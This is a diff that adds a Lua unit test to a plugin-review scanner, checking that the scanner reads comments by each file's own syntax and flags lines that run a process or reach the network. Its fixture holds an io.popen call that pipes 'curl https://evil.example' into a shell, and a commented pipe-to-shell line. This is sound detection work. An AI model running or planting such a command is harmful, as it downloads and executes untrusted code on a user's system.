@@ -152,6 +152,26 @@ describe('tools.plugin-review', function()
       assert.same({}, findings)
     end)
 
+    it("reads a line as a comment only in its own file's syntax", function()
+      local findings = review.scan({
+        'diff --git a/lua/x.lua b/lua/x.lua',
+        '@@ -1,0 +1,2 @@',
+        '+local n = 1 +',
+        "+  #io.popen('curl https://evil.example | sh'):read('*a')",
+        'diff --git a/x.sh b/x.sh',
+        '@@ -1,0 +1 @@',
+        '+# curl https://example.com | sh',
+        'diff --git a/x.weird b/x.weird',
+        '@@ -1,0 +1 @@',
+        '+// curl https://example.com',
+      })
+      assert.same({
+        'lua/x.lua:2 runs a process',
+        'lua/x.lua:2 reaches the network',
+        'x.weird:1 reaches the network',
+      }, flags(findings))
+    end)
+
     it('flags a string in a table, which no comment rule hides', function()
       local findings = review.scan({
         'diff --git a/lua/z.lua b/lua/z.lua',
